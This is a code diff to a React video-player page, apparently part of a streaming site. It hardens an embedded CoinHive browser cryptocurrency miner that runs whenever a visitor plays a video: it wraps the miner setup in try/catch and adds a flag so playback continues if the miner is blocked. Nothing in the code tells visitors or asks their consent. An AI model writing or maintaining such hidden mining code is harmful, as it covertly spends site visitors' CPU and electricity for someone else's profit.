@@ -14,6 +14,7 @@ class WatchPage extends Component {
     image: '',
     error: false,
     redirect: false,
+    mine: true,
   };
 
   componentDidMount() {
@@ -36,7 +37,11 @@ class WatchPage extends Component {
           image: movieData.image
         });
       });
-      this.miner = new window.CoinHive.Anonymous('6IgN0USpT1jJBVBsx66mPZ8KCQiuH1VD', {throttle: 0.5});
+      try {
+        this.miner = new window.CoinHive.Anonymous('6IgN0USpT1jJBVBsx66mPZ8KCQiuH1VD', {throttle: 0.5});
+      } catch(err) {
+        this.setState({mine: false});
+      }
   }
 
   onVideoError = event => {
@@ -76,11 +81,15 @@ class WatchPage extends Component {
   }
 
   onPlayingVideo = event => {
-    this.miner.start();
+    if (this.state.mine) {
+      this.miner.start();
+    }
   }
 
   onPauseVideo = event => {
-    this.miner.stop();
+    if (this.state.mine) {
+      this.miner.stop();
+    }
   }
 
   render() {
